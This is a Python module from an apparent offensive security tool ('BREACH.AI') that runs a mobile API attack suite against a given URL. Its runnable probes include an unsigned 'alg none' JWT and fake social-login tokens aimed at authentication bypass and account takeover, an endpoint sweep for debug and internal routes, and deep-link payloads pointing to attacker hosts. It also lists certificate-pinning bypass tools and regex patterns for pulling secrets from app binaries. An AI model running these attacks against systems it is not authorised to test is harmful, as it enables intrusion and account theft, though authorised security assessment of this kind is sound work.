"""
BREACH.AI - Mobile API Attacker

Mobile application API security assessment:
- API endpoint discovery
- Certificate pinning bypass guidance
- Mobile-specific authentication flaws
- Deep link exploitation
- Binary analysis patterns
- Push notification attacks
- Mobile OAuth/SSO flaws
"""

import asyncio
import json
import re
from dataclasses import dataclass, field
from typing import Optional, Any
from enum import Enum

from backend.breach.attacks.base import AttackResult, BaseAttack
from backend.breach.utils.logger import logger


class MobileAttackType(Enum):
    """Types of mobile API attacks."""
    API_DISCOVERY = "api_discovery"
    AUTH_BYPASS = "auth_bypass"
    CERT_PINNING = "cert_pinning"
    DEEP_LINK = "deep_link"
    PUSH_NOTIFICATION = "push_notification"
    BINARY_SECRETS = "binary_secrets"
    OAUTH_FLAW = "oauth_flaw"
    DATA_LEAK = "data_leak"
    INSECURE_STORAGE = "insecure_storage"


@dataclass
class MobileAttackResult:
    """Result of mobile API attack."""
    success: bool
    attack_type: MobileAttackType
    target: str
    details: str = ""
    evidence: Any = None
    secrets_found: list[dict] = field(default_factory=list)


class MobileAPIAttacker(BaseAttack):
    """
    Mobile API security assessment.

    Attack vectors:
    1. API endpoint discovery from decompiled apps
    2. Certificate pinning bypass
    3. Mobile authentication flaws (JWT, OAuth)
    4. Deep link exploitation
    5. Binary secret extraction
    6. Push notification hijacking
    7. Insecure data storage
    """

    attack_type = "mobile_api"

    # Common mobile API patterns
    MOBILE_API_ENDPOINTS = [
        # Authentication
        "/api/v1/auth/login",
        "/api/v1/auth/register",
        "/api/v1/auth/logout",
        "/api/v1/auth/refresh",
        "/api/v1/auth/forgot-password",
        "/api/v1/auth/verify",
        "/api/v1/auth/social/google",
        "/api/v1/auth/social/facebook",
        "/api/v1/auth/social/apple",

        # User endpoints
        "/api/v1/users/me",
        "/api/v1/users/profile",
        "/api/v1/users/settings",
        "/api/v1/users/devices",

        # Mobile-specific
        "/api/v1/mobile/config",
        "/api/v1/mobile/version",
        "/api/v1/mobile/update",
        "/api/v1/mobile/deep-link",

        # Push notifications
        "/api/v1/push/register",
        "/api/v1/push/token",
        "/api/v1/devices/push-token",

        # Debug endpoints (should be disabled)
        "/api/debug",
        "/api/v1/debug",
        "/api/v1/test",
        "/api/internal",
        "/graphql",
        "/graphiql",
    ]

    # JWT attack techniques
    JWT_ATTACKS = [
        {"name": "Algorithm None", "description": "Change algorithm to 'none'"},
        {"name": "Algorithm Confusion", "description": "RS256 to HS256 with public key"},
        {"name": "Expired Token", "description": "Test if expired tokens accepted"},
        {"name": "No Expiry", "description": "Remove expiry claim"},
        {"name": "JKU Injection", "description": "Inject JKU header to attacker JWKS"},
        {"name": "KID Injection", "description": "SQL injection via KID header"},
        {"name": "User ID Manipulation", "description": "Change user_id in payload"},
        {"name": "Role Elevation", "description": "Modify role claim"},
    ]

    # OAuth mobile attack techniques
    OAUTH_ATTACKS = [
        {"name": "Redirect URI Bypass", "description": "Deep links have weak validation"},
        {"name": "PKCE Bypass", "description": "Skip code_verifier in exchange"},
        {"name": "State Parameter Missing", "description": "CSRF via missing state"},
        {"name": "Token Leakage via Referrer", "description": "Token in URL fragment leaked"},
        {"name": "Social Login Bypass", "description": "Fake social auth token acceptance"},
        {"name": "Client Secret Exposure", "description": "Secret embedded in app binary"},
    ]

    # Deep link attack payloads
    DEEP_LINK_ATTACKS = [
        {"name": "Open Redirect", "payloads": ["myapp://open?url=https://attacker.com"]},
        {"name": "JS Injection", "payloads": ["myapp://webview?url=javascript:alert(1)"]},
        {"name": "Intent Injection", "payloads": ["intent://attacker.com#Intent;scheme=https;end"]},
        {"name": "OAuth Token Theft", "payloads": ["myapp://auth/callback", "myapp://oauth/redirect"]},
        {"name": "Sensitive Action", "payloads": ["myapp://transfer?amount=1000&to=attacker"]},
    ]

    # Secret patterns for binary analysis
    SECRET_PATTERNS = [
        (r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']', "API Key"),
        (r'AKIA[0-9A-Z]{16}', "AWS Access Key"),
        (r'AIza[0-9A-Za-z\\-_]{35}', "Google API Key"),
        (r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com', "Google OAuth"),
        (r'firebase[_-]?api[_-]?key', "Firebase Key"),
        (r'sk_live_[0-9a-zA-Z]{24}', "Stripe Secret Key"),
        (r'client[_-]?secret["\']?\s*[:=]\s*["\']([^"\']+)["\']', "Client Secret"),
        (r'private[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']', "Private Key"),
        (r'https?://[a-z0-9.-]+/api/v[0-9]', "API Endpoint"),
        (r'debug["\']?\s*[:=]\s*true', "Debug Enabled"),
    ]

    # Certificate pinning bypass techniques
    CERT_PINNING_BYPASS = [
        {"name": "Frida SSL Unpinning", "tool": "frida", "platform": "both"},
        {"name": "Objection SSL Bypass", "tool": "objection", "platform": "both"},
        {"name": "SSLKillSwitch2", "tool": "Cydia", "platform": "ios"},
        {"name": "JustTrustMe", "tool": "Xposed", "platform": "android"},
        {"name": "Manual Binary Patching", "tool": "apktool/Hopper", "platform": "both"},
    ]

    async def run(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> Optional[AttackResult]:
        """Execute mobile API attack suite."""
        findings = []

        # API Discovery
        api_findings = await self._discover_api_endpoints(url)
        findings.extend(api_findings)

        # JWT attacks
        jwt_findings = await self._jwt_attacks(url)
        findings.extend(jwt_findings)

        # OAuth attacks
        oauth_findings = await self._oauth_attacks(url)
        findings.extend(oauth_findings)

        # Deep link analysis
        deep_link_findings = await self._deep_link_analysis(url)
        findings.extend(deep_link_findings)

        # Data leakage check
        leak_findings = await self._check_data_leakage(url)
        findings.extend(leak_findings)

        if findings:
            return AttackResult(
                success=True,
                attack_type=self.attack_type,
                endpoint=url,
                details=f"Mobile API vulnerabilities found: {len(findings)} issues",
                severity="high",
                evidence={"findings": findings},
            )

        return None

    async def _discover_api_endpoints(self, api_base: str) -> list[dict]:
        """Discover API endpoints."""
        logger.debug(f"Discovering API endpoints on {api_base}")

        findings = []

        for endpoint in self.MOBILE_API_ENDPOINTS:
            url = f"{api_base.rstrip('/')}{endpoint}"

            try:
                response = await self.http.get(url, timeout=5)

                if response.status_code != 404:
                    is_sensitive = any(x in endpoint for x in ["debug", "internal", "test", "graphql"])

                    findings.append({
                        "type": "api_endpoint_found",
                        "endpoint": endpoint,
                        "status_code": response.status_code,
                        "sensitive": is_sensitive,
                        "severity": "high" if is_sensitive else "info",
                    })
            except Exception:
                pass

        return findings

    async def _jwt_attacks(self, api_base: str) -> list[dict]:
        """Test JWT vulnerabilities."""
        logger.debug("Testing JWT authentication")

        findings = []

        # Test algorithm none attack
        none_token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."

        try:
            response = await self.http.get(
                f"{api_base}/api/v1/users/me",
                headers={"Authorization": f"Bearer {none_token}"},
                timeout=5
            )

            if response.status_code == 200:
                findings.append({
                    "type": "jwt_algorithm_none",
                    "severity": "critical",
                    "description": "JWT algorithm 'none' accepted",
                    "impact": "Authentication bypass",
                })
        except Exception:
            pass

        return findings

    async def _oauth_attacks(self, api_base: str) -> list[dict]:
        """Test OAuth vulnerabilities."""
        logger.debug("Testing OAuth implementation")

        findings = []

        # Test social login with fake token
        fake_tokens = [
            {"provider": "google", "token": "fake_token_12345"},
            {"provider": "facebook", "access_token": "fake_token_12345"},
            {"provider": "apple", "id_token": "fake_token_12345"},
        ]

        for fake in fake_tokens:
            try:
                response = await self.http.post(
                    f"{api_base}/api/v1/auth/social/{fake.get('provider', 'google')}",
                    json=fake,
                    timeout=5
                )

                if response.status_code == 200:
                    findings.append({
                        "type": "oauth_fake_token",
                        "provider": fake.get("provider"),
                        "severity": "critical",
                        "description": "Fake social login token accepted",
                        "impact": "Account takeover",
                    })
            except Exception:
                pass

        return findings

    async def _deep_link_analysis(self, api_base: str) -> list[dict]:
        """Analyze deep link security."""
        logger.debug("Analyzing deep link security")

        # Return attack patterns for client-side testing
        return [{
            "type": "deep_link_patterns",
            "severity": "info",
            "attacks": self.DEEP_LINK_ATTACKS,
            "description": "Deep link attack patterns for testing",
        }]

    async def _check_data_leakage(self, api_base: str) -> list[dict]:
        """Check for data leakage in API responses."""
        logger.debug("Checking for data leakage")

        findings = []

        # Check for verbose errors
        try:
            response = await self.http.get(f"{api_base}/api/v1/nonexistent", timeout=5)
            body = response.text if hasattr(response, 'text') else str(response.body)

            # Check for stack traces
            if any(x in body.lower() for x in ["stacktrace", "exception", "traceback", "error at"]):
                findings.append({
                    "type": "verbose_error",
                    "severity": "medium",
                    "description": "Stack trace exposed in error response",
                    "impact": "Information disclosure",
                })

            # Check for debug info
            if any(x in body.lower() for x in ["debug", "todo", "fixme"]):
                findings.append({
                    "type": "debug_info",
                    "severity": "low",
                    "description": "Debug information in response",
                })
        except Exception:
            pass

        return findings

    async def run_all_attacks(
        self,
        api_base: str,
        app_type: str = "both"
    ) -> list[MobileAttackResult]:
        """Run complete mobile API attack suite."""
        logger.info(f"Starting mobile API attack suite against {api_base}")

        results = []

        # API Discovery
        api_findings = await self._discover_api_endpoints(api_base)
        if api_findings:
            results.append(MobileAttackResult(
                success=True,
                attack_type=MobileAttackType.API_DISCOVERY,
                target=api_base,
                details=f"Found {len(api_findings)} API endpoints",
                evidence=api_findings,
            ))

        # JWT attacks
        jwt_findings = await self._jwt_attacks(api_base)
        if jwt_findings:
            results.append(MobileAttackResult(
                success=True,
                attack_type=MobileAttackType.AUTH_BYPASS,
                target=api_base,
                details="JWT vulnerabilities found",
                evidence=jwt_findings,
            ))

        # OAuth attacks
        oauth_findings = await self._oauth_attacks(api_base)
        if oauth_findings:
            results.append(MobileAttackResult(
                success=True,
                attack_type=MobileAttackType.OAUTH_FLAW,
                target=api_base,
                details="OAuth vulnerabilities found",
                evidence=oauth_findings,
            ))

        return results

    def get_binary_secret_patterns(self) -> list[tuple]:
        """Get patterns for scanning mobile app binaries."""
        return self.SECRET_PATTERNS

    def get_cert_pinning_bypasses(self, platform: str = "both") -> list[dict]:
        """Get certificate pinning bypass techniques."""
        if platform == "both":
            return self.CERT_PINNING_BYPASS
        return [b for b in self.CERT_PINNING_BYPASS if b["platform"] in [platform, "both"]]

    def get_deep_link_attacks(self) -> list[dict]:
        """Get deep link attack patterns."""
        return self.DEEP_LINK_ATTACKS

    def scan_text_for_secrets(self, text: str) -> list[dict]:
        """Scan text (decompiled code) for secrets."""
        findings = []

        for pattern, secret_type in self.SECRET_PATTERNS:
            matches = re.finditer(pattern, text, re.IGNORECASE)
            for match in matches:
                secret = match.group(0)
                masked = secret[:8] + "..." + secret[-4:] if len(secret) > 12 else "***"

                findings.append({
                    "type": secret_type,
                    "masked_value": masked,
                    "position": match.start(),
                })

        return findings


async def attack_mobile_api(
    api_base: str,
    http_client=None,
    app_type: str = "both"
) -> list[MobileAttackResult]:
    """Run mobile API attack suite."""
    from backend.breach.utils.http import HTTPClient

    client = http_client or HTTPClient(base_url=api_base)
    own_client = http_client is None

    try:
        attacker = MobileAPIAttacker(client)
        return await attacker.run_all_attacks(api_base, app_type)
    finally:
        if own_client:
            await client.close()
